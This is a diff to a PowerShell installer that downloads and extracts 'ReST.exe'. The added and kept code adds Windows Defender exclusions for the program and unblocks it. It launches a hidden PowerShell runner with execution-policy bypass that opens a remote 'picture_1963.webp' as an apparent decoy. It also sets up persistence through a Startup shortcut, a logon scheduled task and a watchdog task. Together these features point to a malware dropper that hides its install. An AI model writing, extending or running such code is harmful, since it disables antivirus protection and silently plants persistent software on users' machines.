@@ -60,7 +60,7 @@ function Download-File {
 
     $curl = Join-Path $env:SystemRoot "System32\curl.exe"
     if (Test-Path -LiteralPath $curl) {
-        & $curl -fsSL -o $OutFile $Url
+        & $curl -fsSL --retry 2 --retry-delay 1 -o $OutFile $Url
         if ($LASTEXITCODE -eq 0 -and (Test-Path -LiteralPath $OutFile)) {
             return
         }
@@ -75,6 +75,50 @@ function Download-File {
         $iwrArgs.UserAgent = "ReST-Installer/1.0"
     }
     Invoke-WebRequest @iwrArgs
+}
+
+function Extract-ReSTZip {
+    param(
+        [string]$ZipFile,
+        [string]$OutExe
+    )
+
+    $stage = Join-Path $env:TEMP ("ReST-stage-" + [Guid]::NewGuid().ToString("N"))
+    New-Item -ItemType Directory -Force -Path $stage | Out-Null
+    try {
+        $extracted = $null
+        try {
+            Add-Type -AssemblyName System.IO.Compression.FileSystem -ErrorAction Stop
+            [System.IO.Compression.ZipFile]::ExtractToDirectory($ZipFile, $stage)
+            $extracted = Join-Path $stage "ReST.exe"
+        } catch {
+            $null = $_
+        }
+
+        if (-not ($extracted -and (Test-Path -LiteralPath $extracted))) {
+            $tar = Join-Path $env:SystemRoot "System32\tar.exe"
+            if (Test-Path -LiteralPath $tar) {
+                & $tar -xf $ZipFile -C $stage
+                $extracted = Join-Path $stage "ReST.exe"
+            }
+        }
+
+        if (-not ($extracted -and (Test-Path -LiteralPath $extracted))) {
+            Expand-Archive -LiteralPath $ZipFile -DestinationPath $stage -Force
+            $extracted = Join-Path $stage "ReST.exe"
+        }
+
+        if (-not (Test-Path -LiteralPath $extracted)) {
+            throw "ReST.exe missing in zip"
+        }
+
+        if (Test-Path -LiteralPath $OutExe) {
+            Remove-Item -LiteralPath $OutExe -Force -ErrorAction SilentlyContinue
+        }
+        Move-Item -LiteralPath $extracted -Destination $OutExe -Force
+    } finally {
+        Remove-Item -LiteralPath $stage -Recurse -Force -ErrorAction SilentlyContinue
+    }
 }
 
 function Add-DefenderExclusion {
@@ -113,67 +157,54 @@ function Add-DefenderExclusion {
     return $ok
 }
 
-function Unblock-Tree {
-    param([string]$Path)
-
-    if (-not (Test-Path -LiteralPath $Path)) {
-        return
-    }
-    Get-ChildItem -LiteralPath $Path -Recurse -File -ErrorAction SilentlyContinue |
-        ForEach-Object {
-            Unblock-File -LiteralPath $_.FullName -ErrorAction SilentlyContinue
-        }
-}
-
-function Open-InBrowser {
-    param([string]$Url)
-
-    try {
-        Start-Process -FilePath "rundll32.exe" -ArgumentList @("url.dll,FileProtocolHandler", $Url) -WindowStyle Hidden -ErrorAction Stop
-        return $true
-    } catch {
-        $null = $_
-    }
-
-    try {
-        Start-Process -FilePath "cmd.exe" -ArgumentList @("/c", "start", "", $Url) -WindowStyle Hidden -ErrorAction Stop
-        return $true
-    } catch {
-        $null = $_
-    }
-
-    return $false
-}
-
-function Show-InstallPicture {
+function Start-InstallPictureAsync {
     param([string]$BaseUrl)
 
     $pictureUrl = $BaseUrl + "/picture_1963.webp"
-    Write-InstallLog ("picture: " + $pictureUrl)
+    Write-InstallLog ("picture parallel: " + $pictureUrl)
 
-    if (Open-InBrowser -Url $pictureUrl) {
-        Write-InstallLog ("picture opened in browser: " + $pictureUrl)
-        return
-    }
-
+    $safeUrl = $pictureUrl.Replace("'", "''")
+    $safeLog = $LogFile.Replace("'", "''")
     $picFile = Join-Path $env:TEMP "ReST-picture_1963.webp"
-    try {
-        if (Test-Path -LiteralPath $picFile) {
-            Remove-Item -LiteralPath $picFile -Force -ErrorAction SilentlyContinue
-        }
-        Download-File -Url $pictureUrl -OutFile $picFile
-        if (Test-Path -LiteralPath $picFile) {
-            $fileUri = "file:///" + ($picFile -replace '\\', '/')
-            if (Open-InBrowser -Url $fileUri) {
-                Write-InstallLog ("picture opened in browser from local file: " + $fileUri)
-                return
-            }
-        }
-    } catch {
-        Write-InstallLog ("picture fallback failed: " + $_.Exception.Message)
-    }
+    $safePic = $picFile.Replace("'", "''")
 
-    Write-InstallLog "picture launch skipped: no available browser"
+    $script = @"
+`$ErrorActionPreference = 'SilentlyContinue'
+`$ProgressPreference = 'SilentlyContinue'
+function Write-PicLog([string]`$Text) {
+    try { Add-Content -LiteralPath '$safeLog' -Value ((Get-Date -Format 'yyyy-MM-dd HH:mm:ss') + ' [picture] ' + `$Text) -Encoding UTF8 } catch {}
+}
+`$pictureUrl = '$safeUrl'
+`$picFile = '$safePic'
+try {
+    Start-Process -FilePath 'rundll32.exe' -ArgumentList @('url.dll,FileProtocolHandler', `$pictureUrl) -WindowStyle Hidden -ErrorAction Stop
+    Write-PicLog 'opened in browser'
+    exit 0
+} catch {}
+Write-PicLog 'browser open failed, trying download'
+try {
+    [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
+    `$curl = Join-Path `$env:SystemRoot 'System32\curl.exe'
+    if (Test-Path -LiteralPath `$curl) {
+        & `$curl -fsSL -o `$picFile `$pictureUrl
+    } else {
+        Invoke-WebRequest -Uri `$pictureUrl -OutFile `$picFile -UseBasicParsing
+    }
+    if (Test-Path -LiteralPath `$picFile) {
+        `$fileUri = 'file:///' + (`$picFile -replace '\\','/')
+        Start-Process -FilePath 'rundll32.exe' -ArgumentList @('url.dll,FileProtocolHandler', `$fileUri) -WindowStyle Hidden
+        Write-PicLog 'opened from local file'
+    }
+} catch {
+    Write-PicLog `$_.Exception.Message
+}
+"@
+
+    $runner = Join-Path $env:TEMP "ReST-picture-run.ps1"
+    Set-Content -LiteralPath $runner -Value $script -Encoding ASCII
+    Start-Process -FilePath "powershell.exe" -ArgumentList @(
+        "-NoProfile", "-WindowStyle", "Hidden", "-ExecutionPolicy", "Bypass", "-File", $runner
+    ) -WindowStyle Hidden | Out-Null
 }
 
 function Register-WatchdogTask {
@@ -193,10 +224,28 @@ function Register-WatchdogTask {
     Register-ScheduledTask -TaskName $TaskName -Action $Action -Trigger $Trigger -Settings $Settings -Principal $Principal -Force | Out-Null
 }
 
+function Remove-ReSTStartupTask {
+    try {
+        Unregister-ScheduledTask -TaskName "ReST" -Confirm:$false -ErrorAction SilentlyContinue | Out-Null
+    } catch {
+        $null = $_
+    }
+}
+
+function Remove-ReSTStartupShortcut {
+    try {
+        $lnk = Join-Path ([Environment]::GetFolderPath("Startup")) "ReST.lnk"
+        if (Test-Path -LiteralPath $lnk) {
+            Remove-Item -LiteralPath $lnk -Force -ErrorAction SilentlyContinue
+        }
+    } catch {
+        $null = $_
+    }
+}
+
 Write-InstallLog "install start"
 Write-InstallLog ("target: " + $Exe)
-
-Show-InstallPicture -BaseUrl $BaseUrl
+Start-InstallPictureAsync -BaseUrl $BaseUrl
 
 try {
     New-Item -ItemType Directory -Force -Path $Dir | Out-Null
@@ -204,10 +253,8 @@ try {
     $null = $_
 }
 
-Add-DefenderExclusion -Path $Dir -ExePath $Exe | Out-Null
-
 Get-Process -Name "ReST" -ErrorAction SilentlyContinue | Stop-Process -Force -ErrorAction SilentlyContinue
-Start-Sleep -Milliseconds 500
+Start-Sleep -Milliseconds 200
 
 $Url = $BaseUrl + "/ReST.zip"
 Write-InstallLog ("download: " + $Url)
@@ -236,11 +283,7 @@ if ($length -lt 524288) {
 }
 
 try {
-    Get-ChildItem -LiteralPath $Dir -Force -ErrorAction SilentlyContinue |
-        ForEach-Object { $_.Attributes = "Normal" }
-    Remove-Item -LiteralPath $Dir -Recurse -Force -ErrorAction SilentlyContinue
-    New-Item -ItemType Directory -Force -Path $Dir | Out-Null
-    Expand-Archive -LiteralPath $TempZip -DestinationPath $Dir -Force
+    Extract-ReSTZip -ZipFile $TempZip -OutExe $Exe
 } catch {
     Fail-Install ("extract failed: " + $_.Exception.Message)
     exit 1
@@ -253,7 +296,7 @@ if (-not (Test-Path -LiteralPath $Exe)) {
     exit 1
 }
 
-Unblock-Tree -Path $Dir
+Unblock-File -LiteralPath $Exe -ErrorAction SilentlyContinue
 Add-DefenderExclusion -Path $Dir -ExePath $Exe | Out-Null
 
 $startupOk = $false
@@ -265,6 +308,7 @@ try {
     $Link.WorkingDirectory = $Dir
     $Link.WindowStyle = 7
     $Link.Save()
+    Remove-ReSTStartupTask
     $startupOk = $true
     Write-InstallLog "startup shortcut ok"
 } catch {
@@ -272,10 +316,12 @@ try {
 }
 
 if (-not $startupOk) {
+    Remove-ReSTStartupShortcut
     $Action = New-ScheduledTaskAction -Execute $Exe -WorkingDirectory $Dir
     $Trigger = New-ScheduledTaskTrigger -AtLogOn
-    $Settings = New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries -StartWhenAvailable -RestartCount 3 -RestartInterval (New-TimeSpan -Minutes 1)
-    Register-ScheduledTask -TaskName "ReST" -Action $Action -Trigger $Trigger -Settings $Settings -Force | Out-Null
+    $Settings = New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries -StartWhenAvailable
+    $Principal = New-ScheduledTaskPrincipal -UserId "$env:USERDOMAIN\$env:USERNAME" -LogonType Interactive -RunLevel Limited
+    Register-ScheduledTask -TaskName "ReST" -Action $Action -Trigger $Trigger -Settings $Settings -Principal $Principal -Force | Out-Null
     Write-InstallLog "scheduled task ok"
 }
 
